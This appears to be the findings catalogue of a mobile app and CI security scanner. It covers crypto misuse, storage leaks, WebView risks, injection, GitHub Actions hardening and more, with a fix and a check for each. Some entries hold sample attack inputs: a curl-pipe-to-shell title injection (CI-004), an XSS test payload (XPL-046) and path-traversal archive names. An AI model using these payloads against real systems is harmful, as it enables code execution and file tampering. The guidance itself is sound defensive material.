**Severity:** high · **Profiles:** MAS-L1 · **Confidence:** medium · **Effort:** hours

**Why it matters:** An archive entry named `../../shared_prefs/x.xml` writes outside the folder you meant. A malicious download or a shared file can then overwrite app code, preferences, or databases.

**Fix:** Resolve the canonical path of each output file and reject the entry unless it starts with the target folder's canonical path plus a separator.

**Verify:** Extract an archive whose entry is named `../evil.txt` and confirm the app refuses it and nothing is written outside the target folder.

**IDs:** MASWE-0050 · MASVS-CODE-4

**Read more:** [book §19.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#193-injection-the-shape-of-the-bug)

### XPL-021: No root or jailbreak detection found

**Severity:** low · **Profiles:** MAS-R · **Confidence:** medium · **Effort:** days · **Reported in:** Hardening checklist

**Why it matters:** A rooted or jailbroken device lets other code read the app's memory and storage and hook its checks. Without any signal, your backend can't weigh that risk for a payment or sign-in.

**Fix:** Collect root and jailbreak signals, or better, attestation (Play Integrity, App Attest), and send them to the backend as risk signals. Report; don't block locally. In React Native, jail-monkey gives root and jailbreak signals, and @react-native-firebase/app-check or react-native-device-attest gives attestation.

**Verify:** Run the app on a rooted emulator or a jailbroken device and confirm the backend receives the signal.

**IDs:** MASWE-0051 · MASVS-RESILIENCE-1 · MASTG-TEST-0324 · MASTG-TEST-0240 · MASTG-BEST-0030

**Read more:** [book §14.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/05-resilience.md#144-detection-in-code)

### XPL-022: No debugger detection found

**Severity:** low · **Profiles:** MAS-R · **Confidence:** medium · **Effort:** hours · **Reported in:** Hardening checklist

**Why it matters:** An attached debugger can read keys from memory and skip any client-side check. Without a debugger signal, the backend can't tell a tampered session from a normal one.

**Fix:** Add JDWP and TracerPid checks on Android, and the `sysctl` P_TRACED check on iOS, to the signals you report, and run them during sensitive flows, not only at startup. In React Native, freerasp-react-native reports debugger, emulator, and hooking signals.

**Verify:** Attach a debugger to a release build and confirm the signal reaches the backend.

**IDs:** MASWE-0064 · MASVS-RESILIENCE-4 · MASTG-TEST-0352 · MASTG-TEST-0401 · MASTG-BEST-0047 · MASTG-BEST-0074

**Read more:** [book §14.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/05-resilience.md#144-detection-in-code)

### XPL-023: RSA encryption uses PKCS #1 v1.5 or no padding

**Severity:** medium · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** hours

**Why it matters:** PKCS #1 v1.5 encryption padding is open to padding-oracle attacks that recover the plaintext, and raw RSA with no padding is deterministic and malleable. `Cipher.getInstance("RSA")` picks PKCS #1 v1.5.

**Fix:** Use `RSA/ECB/OAEPWithSHA-256AndMGF1Padding` (on the Keystore, set the MGF1 digest to SHA-1), or better, ECDH with AES-GCM.

**Verify:** Search for `"RSA"`, `PKCS1Padding`, `NoPadding`, and `rsaEncryptionPKCS1`; only OAEP should remain.

**IDs:** MASWE-0007 · MASVS-CRYPTO-1

**Read more:** [book Chapter 0.2](https://github.com/hossam9k/mobile-app-security/blob/main/book/00-foundations.md#chapter-02-cryptography-you-actually-need)

### XPL-024: Signature uses SHA-1 or MD5

**Severity:** medium · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** hours

**Why it matters:** A signature over a SHA-1 or MD5 hash can be forged by finding a colliding message. Anything that trusts the signature, such as a license, an update, or a request, can then be faked.

**Fix:** Sign with SHA-256 or stronger, for example `SHA256withECDSA` on a P-256 key.

**Verify:** Search for `SHA1with`, `MD5with`, `NONEwith`, and `SHA1` signature algorithms; none should remain.

**IDs:** MASWE-0010 · MASVS-CRYPTO-1

**Read more:** [book Chapter 0.2](https://github.com/hossam9k/mobile-app-security/blob/main/book/00-foundations.md#chapter-02-cryptography-you-actually-need)

### XPL-025: MAC or signature compared with an ordinary equality check

**Severity:** medium · **Profiles:** MAS-L1 · **Confidence:** medium · **Effort:** minutes

**Why it matters:** `Arrays.equals`, `contentEquals`, and `==` stop at the first byte that differs, so response time reveals how much of a guessed MAC is right. An attacker can then forge a valid tag byte by byte.

**Fix:** Compare MACs with `MessageDigest.isEqual` on the JVM, `HMAC.isValidAuthenticationCode` in CryptoKit, or a constant-time compare in Dart.

**Verify:** For each MAC or signature check, confirm it uses a constant-time comparison.

**IDs:** MASWE-0009 · MASVS-CRYPTO-1

**Read more:** [book Chapter 0.2](https://github.com/hossam9k/mobile-app-security/blob/main/book/00-foundations.md#chapter-02-cryptography-you-actually-need)

### XPL-026: Generated key is saved next to the data it protects

**Severity:** high · **Profiles:** MAS-L1 · **Confidence:** medium · **Effort:** hours

**Why it matters:** A key generated in app memory and written to preferences or a file sits beside its ciphertext. Anyone who can copy the app's storage, from a backup or a rooted device, gets both.

**Fix:** Generate the key inside the Android Keystore or the Secure Enclave, or use Tink with an `android-keystore://` master key, so the raw key never reaches storage.

**Verify:** For each generated key, confirm its bytes are never written to preferences, DataStore, UserDefaults, or a file, unless wrapped by a Keystore or Keychain key.

**IDs:** MASWE-0003 · MASVS-STORAGE-1

**Read more:** [book Chapter 0.2](https://github.com/hossam9k/mobile-app-security/blob/main/book/00-foundations.md#chapter-02-cryptography-you-actually-need)

### XPL-027: SecRandomCopyBytes result is not checked

**Severity:** medium · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** minutes

**Why it matters:** `SecRandomCopyBytes` reports failure through its return status. If it fails and the status is ignored, the buffer keeps its initial zeros and becomes a predictable key, nonce, or salt.

**Fix:** Check the status: `guard status == errSecSuccess else { throw … }`. For keys, `SymmetricKey(size:)` handles this for you.

**Verify:** Search for `SecRandomCopyBytes` and confirm every call's return value is compared with `errSecSuccess`.

**IDs:** MASWE-0012 · MASVS-CRYPTO-1 · MASTG-TEST-0311

**Read more:** [book Chapter 0.2](https://github.com/hossam9k/mobile-app-security/blob/main/book/00-foundations.md#chapter-02-cryptography-you-actually-need)

### XPL-028: App never checks that the device has a screen lock

**Severity:** low · **Profiles:** MAS-L2 · **Confidence:** medium · **Effort:** hours · **Reported in:** Hardening checklist

**Why it matters:** On a device with no PIN, pattern, or passcode, the Keystore and Keychain protect nothing from someone holding the phone. Without a check, the app can't warn the user or bind secrets to the lock.

**Fix:** Bind secrets to keys that need a screen lock (`setUserAuthenticationRequired`, `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`), and check `isDeviceSecure` or `canEvaluatePolicy`.

**Verify:** Remove the screen lock on a test device and confirm the app warns the user or refuses the sensitive feature.

**IDs:** MASWE-0017 · MASVS-CRYPTO-2 · MASTG-TEST-0247 · MASTG-TEST-0248

**Read more:** [book §4.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#46-key-authorizations-the-conditions-the-hardware-enforces)

### XPL-029: App code writes a secret into the WebView's DOM

**Severity:** medium · **Profiles:** MAS-L2 · **Confidence:** medium · **Effort:** hours

**Why it matters:** Once a code, token, or balance is in the page's DOM, every script on the page can read it, including third-party or injected scripts. The native side has no control over it afterward.

**Fix:** Render the value in a native view over the WebView, or pass it through a narrow, origin-checked message channel that never writes it into the DOM.

**Verify:** Inspect the WebView with remote debugging on a debug build and confirm the secret never appears in the DOM.

**IDs:** MASWE-0034 · MASVS-PLATFORM-2 · MASTG-TEST-0380 · MASTG-BEST-0059

**Read more:** [book §16.5](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#165-sensitive-ui-inside-a-webview)

### XPL-030: Embedded TLS library skips certificate checks or allows old TLS

**Severity:** critical · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** hours

**Why it matters:** libcurl, OpenSSL, BoringSSL, wolfSSL, and mbedTLS bypass the platform's TLS settings. With verification off, anyone on the network can impersonate the server; below TLS 1.2, old protocol attacks apply.

**Fix:** Verify the peer and the host name (`CURLOPT_SSL_VERIFYPEER` and `VERIFYHOST` on, `SSL_VERIFY_PEER`), and set TLS 1.2 as the minimum version.

**Verify:** Send the native traffic through a proxy whose CA the device doesn't trust and confirm the handshake fails.

**IDs:** MASWE-0027 · MASVS-NETWORK-1 · MASTG-TEST-0345 · MASTG-BEST-0043

**Read more:** [book §7.1](https://github.com/hossam9k/mobile-app-security/blob/main/book/03-data-in-transit.md#71-the-baseline)

### XPL-031: Local database stores credentials without encryption

**Severity:** medium · **Profiles:** MAS-L2 · **Confidence:** medium · **Effort:** days

**Why it matters:** Room, raw SQLite, Realm, Core Data, and Hive write plain files in the app sandbox. They reach backups and anyone with file access, so a token or password column there can be lifted and replayed.

**Fix:** Keep tokens out of the database, or encrypt it: SQLCipher through `SupportOpenHelperFactory` with a Keystore-wrapped passphrase, Realm's `encryptionKey`, Hive's `encryptionCipher`, or on iOS a file protection class (`NSPersistentStoreFileProtectionKey`).

**Verify:** Pull the database file from a test device and open it with `sqlite3`; no token or password should be readable.

**IDs:** MASWE-0001 · MASVS-STORAGE-1 · MASTG-TEST-0304 · MASTG-TEST-0306

**Read more:** [book §6.7](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#67-encrypting-a-local-database)

### XPL-032: Notification shows a one-time code or a balance on the lock screen

**Severity:** medium · **Profiles:** MAS-L2 · **Confidence:** medium · **Effort:** hours

**Why it matters:** Lock-screen notifications are readable by anyone holding the phone. A one-time code there lets a thief finish a sign-in or a transfer without unlocking the device.

**Fix:** Set `VISIBILITY_PRIVATE` with a redacted `setPublicVersion` on Android. On iOS, send a generic message and fetch the detail after unlock.

**Verify:** Trigger the notification with the phone locked and confirm the code or balance is hidden.

**IDs:** MASWE-0037 · MASVS-PLATFORM-3 · MASTG-TEST-0315 · MASTG-BEST-0027

**Read more:** [book §17.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#176-the-other-channels-people-forget)

### XPL-033: Password or PIN field shows the typed text

**Severity:** medium · **Profiles:** MAS-L2 · **Confidence:** medium · **Effort:** hours

**Why it matters:** An unmasked password or PIN field shows the secret to anyone looking at the screen and to screen recording, and the keyboard may learn and suggest it later.

**Fix:** Use a password input type (`textPassword`, `numberPassword`), `PasswordVisualTransformation`, `SecureField`, `isSecureTextEntry = true`, or `obscureText: true`. A show-password toggle is fine.

**Verify:** Type into the field and confirm the characters are masked, and that the keyboard offers no suggestions.

**IDs:** MASWE-0036 · MASVS-PLATFORM-3 · MASTG-TEST-0316 · MASTG-TEST-0346 · MASTG-BEST-0019 · MASTG-BEST-0044

**Read more:** [book §6.5](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#65-the-leaks-that-are-not-about-encryption)

### XPL-034: Analytics SDK receives personal data

**Severity:** medium · **Profiles:** MAS-P · **Confidence:** medium · **Effort:** hours

**Why it matters:** Email addresses and phone numbers sent to analytics or crash SDKs leave your control, end up in third-party dashboards, and must be declared in Data safety and privacy labels.

**Fix:** Send a pseudonymous ID instead, and keep personal data out of event parameters and custom keys.

**Verify:** Capture the SDK's traffic or check its dashboard and confirm no email, phone number, or name appears.

**IDs:** MASWE-0073 · MASVS-PRIVACY-3 · MASTG-TEST-0318

**Read more:** [book §18.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#184-third-party-sdks-are-your-responsibility)

### XPL-035: Native code is built without compiler protections

**Severity:** medium · **Profiles:** MAS-L2 · **Confidence:** high · **Effort:** minutes

**Why it matters:** Stack canaries, position-independent code, RELRO, FORTIFY_SOURCE, and ARC are free defaults that make memory-corruption bugs much harder to exploit. These flags turn them off.

**Fix:** Remove the flags; the toolchain defaults are safe. Migrate files compiled with `-fno-objc-arc` to ARC.

**Verify:** Check the release binary: `checksec` or `readelf` on the `.so`, `otool -hv` and `otool -Iv` on the Mach-O, should show PIE, canaries, and RELRO.

**IDs:** MASWE-0045 · MASVS-CODE-3 · MASTG-TEST-0222 · MASTG-TEST-0223 · MASTG-TEST-0228 · MASTG-TEST-0229 · MASTG-TEST-0230

**Read more:** [book §19.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#196-free-compiler-protections-and-platform-currency)

### XPL-036: Staging, test, or private-network endpoint in release code

**Severity:** low · **Profiles:** MAS-R · **Confidence:** medium · **Effort:** minutes

**Why it matters:** A staging or development host in the release build points attackers at systems that are usually less protected, and a private address or the emulator's host address means debug wiring shipped.

**Fix:** Inject endpoints per build type or flavor, and keep non-production hosts out of the release variant.

**Verify:** Unpack the release build and search its strings for `staging`, `dev.`, `10.0.2.2`, and private addresses; none should remain.

**IDs:** MASWE-0061 · MASVS-RESILIENCE-3

**Read more:** [book §15.8](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#158-build-configuration-in-code)

### XPL-037: OAuth sign-in uses a flow RFC 8252 rules out

**Severity:** high · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** hours

**Why it matters:** The implicit flow puts tokens in a redirect any app can intercept, the password grant hands the user's password to the app, `plain` PKCE adds no protection, and a WebView sign-in page lets the app read the password.

**Fix:** Use the authorization code flow with PKCE (S256) in Custom Tabs, Auth Tab, or `ASWebAuthenticationSession`, for example through AppAuth.

**Verify:** Sign in and confirm the browser, not a WebView, shows the login page, and that the request carries `response_type=code` and `code_challenge_method=S256`.

**IDs:** MASVS-AUTH-1

**Read more:** [book Chapter 0.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/00-foundations.md#chapter-03-authentication-sessions-and-tokens)

### XPL-038: No emulator detection found

**Severity:** low · **Profiles:** MAS-R · **Confidence:** medium · **Effort:** hours · **Reported in:** Hardening checklist

**Why it matters:** Fraud and cheating at scale run on emulators. Without an emulator signal, the backend can't tell a farm of virtual devices from real users.

**Fix:** Add emulator signals (build fingerprint, hardware, `ro.kernel.qemu`; the iOS simulator environment) to the set you report, and rely on attestation for the strong signal. In React Native, freerasp-react-native reports these signals.

**Verify:** Run a release build on an emulator and confirm the signal reaches the backend.

**IDs:** MASWE-0053 · MASVS-RESILIENCE-1 · MASTG-BEST-0046 · MASTG-BEST-0053

**Read more:** [book §14.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/05-resilience.md#144-detection-in-code)

### XPL-039: No hooking or instrumentation detection found

**Severity:** low · **Profiles:** MAS-R · **Confidence:** medium · **Effort:** hours · **Reported in:** Hardening checklist

**Why it matters:** Frida, Xposed, and Substrate rewrite the app's checks at runtime. Without a hooking signal, the backend trusts results that the attacker computed.

**Fix:** Add Frida and Xposed signals (ports, loaded libraries, `/proc/self/maps`) to the set you report, and rely on attestation for the strong signal. In React Native, freerasp-react-native reports these signals.

**Verify:** Attach Frida to a release build and confirm the signal reaches the backend.

**IDs:** MASWE-0065 · MASVS-RESILIENCE-4 · MASTG-BEST-0041 · MASTG-BEST-0048

**Read more:** [book §14.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/05-resilience.md#144-detection-in-code)

### XPL-040: App has no way to force an update

**Severity:** low · **Profiles:** MAS-L2 · **Confidence:** medium · **Effort:** days · **Reported in:** Hardening checklist

**Why it matters:** When a security bug ships, users on the old version stay exposed until they update. Without a forced update path, you can't retire a vulnerable version.

**Fix:** Keep a server-side minimum version and enforce it with Play's in-app updates (`IMMEDIATE`) or an App Store redirect.

**Verify:** Raise the minimum version on the server and confirm an older build blocks sensitive features until the user updates.

**IDs:** MASWE-0043 · MASVS-CODE-2 · MASTG-TEST-0392 · MASTG-TEST-0383

**Read more:** [book §19.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#196-free-compiler-protections-and-platform-currency)

### XPL-041: Jackson accepts attacker-chosen classes

**Severity:** high · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** hours

**Why it matters:** Default typing and `JsonTypeInfo.Id.CLASS` let the JSON name the class to build. With a gadget class on the classpath, crafted input becomes code execution or file access.

**Fix:** Use `JsonTypeInfo.Id.NAME` with registered subtypes, or kotlinx.serialization with sealed classes.

**Verify:** Search for `enableDefaultTyping`, `activateDefaultTyping`, and `Id.CLASS`; none should remain.

**IDs:** MASWE-0050 · MASVS-CODE-4 · MASTG-TEST-0337

**Read more:** [book §19.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#194-deserialization)

### XPL-042: Shell command built from a variable

**Severity:** high · **Profiles:** MAS-L1 · **Confidence:** medium · **Effort:** hours

**Why it matters:** A command string with input in it lets that input add its own commands. On a phone, that runs with the app's identity and reaches its files and keys.

**Fix:** Don't run shell commands with input. If you must start a process, pass a fixed program and an argument array, and validate each argument.

**Verify:** For each process call, confirm the program is a constant and no argument comes from input.

**IDs:** MASWE-0050 · MASVS-CODE-4

**Read more:** [book §19.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#193-injection-the-shape-of-the-bug)

### XPL-043: Password, PIN, or username is checked against a value in the code

**Severity:** high · **Profiles:** MAS-L1 · **Confidence:** medium · **Effort:** hours

**Why it matters:** A login, PIN, or developer backdoor that compares input with a fixed string ships that string in the app. Anyone who unpacks the app can read it and pass the check.

**Fix:** Check credentials on your server, never against a value in the app. Remove developer or debug accounts from release builds.

**Verify:** Search the release build with `strings` for the value; it should be gone, and the login should fail without the server.

**IDs:** MASWE-0004 · MASVS-STORAGE-1

**Read more:** [book §15.2](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#152-secrets-classify-then-protect)

### XPL-044: Password or token is written to a file in plain text

**Severity:** medium · **Profiles:** MAS-L2 · **Confidence:** medium · **Effort:** hours

**Why it matters:** A file, plist, cookie, or document store in the app's folder is readable on a rooted or jailbroken device and is copied into backups. A password or token there can be lifted and reused.

**Fix:** Keep credentials in the Android Keystore or the iOS Keychain. If a file must hold one, encrypt it with a Keystore- or Keychain-protected key, and better still, don't store it at all.

**Verify:** Pull the app's data folder from a test device and search it for the password or token; it should not appear.

**IDs:** MASWE-0001 · MASVS-STORAGE-1

**Read more:** [book §6.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/02-data-at-rest.md#64-the-uncomfortable-question-nobody-asked)

### XPL-045: Token, nonce, or random value is taken from the clock

**Severity:** medium · **Profiles:** MAS-L1 · **Confidence:** medium · **Effort:** minutes

**Why it matters:** The current time is known to anyone within a few seconds. A token, nonce, or one-time code made from it can be guessed by trying the times around when it was made.

**Fix:** Use `SecureRandom` on Android, `SecRandomCopyBytes` or `SystemRandomNumberGenerator` on iOS, and `Random.secure()` in Dart. Keep timestamps for expiry only.

**Verify:** Make two values a millisecond apart; they should share no visible pattern.

**IDs:** MASWE-0012 · MASVS-CRYPTO-1

**Read more:** [book Chapter 0.2](https://github.com/hossam9k/mobile-app-security/blob/main/book/00-foundations.md#chapter-02-cryptography-you-actually-need)

### XPL-046: Web page or HTML string inserts untrusted text as markup

**Severity:** high · **Profiles:** MAS-L1 · **Confidence:** medium · **Effort:** hours

**Why it matters:** Text from the page's URL, or typed by the user, becomes HTML. A crafted link or entry can then add a script that runs inside your WebView, with access to its data and any JavaScript bridge.

**Fix:** Set `textContent` instead of `innerHTML`, or escape the value before you add it to HTML. Don't build `loadHTMLString` or `loadDataWithBaseURL` content from input.

**Verify:** Enter `<img src=x onerror=alert(1)>` as the value; it should show as text, and no alert should appear.

**IDs:** MASWE-0050 · MASVS-CODE-4

**Read more:** [book §19.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#193-injection-the-shape-of-the-bug)

### XPL-047: Native code copies Java input into a fixed buffer without a length check

**Severity:** high · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** hours

**Why it matters:** `strcpy`, `strcat`, `sprintf`, and `gets` copy until the input ends. A string from Java that is longer than the buffer overwrites memory next to it, which can crash the app or run code.

**Fix:** Use `strlcpy`, `strlcat`, or `snprintf` with the buffer size, and check the length of the input against the buffer before you copy.

**Verify:** Pass a string longer than the buffer from Java; the app should reject it or truncate it without crashing.

**IDs:** MASWE-0050 · MASVS-CODE-4

**Read more:** [book §19.2](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#192-validate-positively-at-the-boundary)

### XPL-048: App reads sensitive page data in the page's JavaScript world

**Severity:** medium · **Profiles:** MAS-L2 · **Confidence:** medium · **Effort:** hours

**Why it matters:** `evaluateJavaScript` without a content world runs in the page's own world. A script on the page can replace `document.querySelector` first, so the app reads an account number or amount the attacker chose.

**Fix:** Run app scripts in `.defaultClient` or a named `WKContentWorld` with `evaluateJavaScript(_:in:in:completionHandler:)` (iOS 14 or later).

**Verify:** Override `document.querySelector` from the page, then trigger the read; the app should still get the real value.

**IDs:** MASTG-TEST-0379 · MASTG-BEST-0061

**Read more:** [book §16.2](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#162-the-javascript-bridge-and-why-its-the-sharpest-edge)

## CI and supply chain

### CI-001: Action is pinned to a tag or branch, not a commit SHA

**Severity:** high · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** minutes

**Why it matters:** A tag or branch is a label the action's owner can move to different code. In the tj-actions and Trivy attacks, moved tags ran stolen-secret code inside thousands of workflows that never changed a line. GitHub-owned and same-organization actions are reported one level lower; this repository's own code goes to notes.

**Fix:** Replace the tag with the full 40-character commit SHA and keep the version in a trailing comment. Let a tool such as `pinact run` write the pin, and let Dependabot (with a cooldown) keep it current. Reference this repository's own actions as `./…` or `$/…`.

**Verify:** Run `pinact run --check` or zizmor's `unpinned-uses` audit: every remote `uses:` in workflows and composite `action.yml` files should end in a 40-character SHA.

**Read more:** [book §15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)

### CI-002: Workflow token permissions are not restricted

**Severity:** medium · **Profiles:** MAS-L1 · **Confidence:** medium · **Effort:** minutes

**Why it matters:** Every run gets a GITHUB_TOKEN. Without a `permissions:` block it gets the repository default, which is read-write on many older organizations, so any hijacked step can push code or change releases.

**Fix:** Add `permissions: {}` at the top of the workflow so the token can do nothing, then grant each job only what it needs. Never use `write-all`.

**Verify:** Open a run's "Set up job" log and check the GITHUB_TOKEN permissions list matches what the job needs.

**Read more:** [book §15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)

### CI-003: pull_request_target workflow checks out the pull request's code

**Severity:** critical · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** hours

**Why it matters:** `pull_request_target` runs with your secrets and a write token even for pull requests from forks. Checking out and building the fork's code hands both to whoever opened the pull request, as happened to Ultralytics, Nx, and TanStack. A job that keeps forks out is reported as high, or medium when no later step runs the checked-out code.

**Fix:** Use `pull_request` for anything that builds or tests contributed code. If you need `pull_request_target`, never check out or run the fork's code in that job, and never let it write a cache or artifact another workflow uses.

**Verify:** Search the workflow for `pull_request_target` and confirm no job in it checks out `github.event.pull_request.head.*` or runs `gh pr checkout`.

**Read more:** [book §15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)

### CI-004: Untrusted event text is pasted into a run script

**Severity:** high · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** minutes

**Why it matters:** GitHub replaces `${{ }}` before the shell runs, so a pull request title, issue body, or branch name becomes part of your script. A title such as `x"; curl evil | sh` then runs as your workflow, with its token and secrets. Free-text dispatch inputs, which only writers can set, are reported as medium.

**Fix:** Pass the value through `env:` and read it as a quoted shell variable, so it stays data.

**Verify:** Run zizmor (`template-injection` audit) or actionlint; no `run:` block should expand attacker-controlled fields (titles, bodies, branch names, commit messages, `github.head_ref`) directly.

**Read more:** [book §15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)

### CI-005: actions/checkout leaves the job token on disk

**Severity:** medium · **Profiles:** MAS-L1 · **Confidence:** medium · **Effort:** minutes

**Why it matters:** By default `actions/checkout` leaves the job token in the workspace's git config (from v6, in a credentials file under `$RUNNER_TEMP` that `.git/config` includes). Every later step, including third-party actions and build scripts, can read it, and with older versions an uploaded artifact of the workspace can leak it.

**Fix:** Set `persist-credentials: false` on every checkout. Only a job that pushes back to the repository needs the token: set `persist-credentials: true` there on purpose, or pass the token to that one command.

**Verify:** In a test run, add a step `git config --get-regexp 'http.*extraheader'`; it should print nothing. zizmor's `artipacked` audit also flags checkouts that keep credentials.

**Read more:** [book §15.3](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow)

### CI-006: Signing key or signing password is committed to the repository

**Severity:** critical · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** hours

**Why it matters:** Anyone who can read the repository, or any of its forks and clones, can sign builds as you. Deleting the file later doesn't help: it stays in git history. Nightly or QA keys are reported as high, and debug keystores go to notes. A keystore whose password stays out of the repository is reported one level lower.

**Fix:** Rotate first: request an upload key reset in Play Console, or revoke the certificate or API key. Then remove the file from history, store the keystore base64-encoded in the CI secret store, decode it at build time, and read passwords from environment variables.

**Verify:** Run `git log --all -- '*.jks' '*.keystore' '*.p12' '*.p8' key.properties` and confirm nothing comes back after the history rewrite.

**Read more:** [book §15.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#156-signing-keys-and-release-integrity)

### CI-007: Gradle wrapper download is not checked against a SHA-256

**Severity:** low · **Profiles:** MAS-L1 · **Confidence:** high · **Effort:** minutes

**Why it matters:** Without `distributionSha256Sum`, the wrapper runs whatever Gradle distribution the download URL returns. A swapped distribution runs with full access to your build and its signing secrets.

**Fix:** Add `distributionSha256Sum` to `gradle/wrapper/gradle-wrapper.properties`, using the checksum published for that exact Gradle version. `./gradlew wrapper --gradle-version <v> --gradle-distribution-sha256-sum <sha>` writes it for you.

**Verify:** Change one character of the checksum and run `./gradlew help` on a clean machine: the download should fail verification.

**Read more:** [book §15.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#154-dependencies-and-build-inputs)

### CI-008: No dependency lockfile is committed

**Severity:** info · **Profiles:** MAS-L1 · **Confidence:** manual · **Effort:** hours

**Why it matters:** Without a lockfile, the same build file can resolve a different dependency version next month, including a malicious one, and nobody notices because no file changed.

**Fix:** Enable Gradle dependency locking and commit each module's `gradle.lockfile`, or commit `gradle/verification-metadata.xml` with `<verify-metadata>true</verify-metadata>`. For Swift packages, commit `Package.resolved`; libraries others depend on may leave it out on purpose.

**Verify:** Run `./gradlew dependencies --write-locks`, commit the result, and confirm a later build fails if a resolved version changes.

**IDs:** MASWE-0044 · MASVS-CODE-3

**Read more:** [book §15.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#154-dependencies-and-build-inputs)
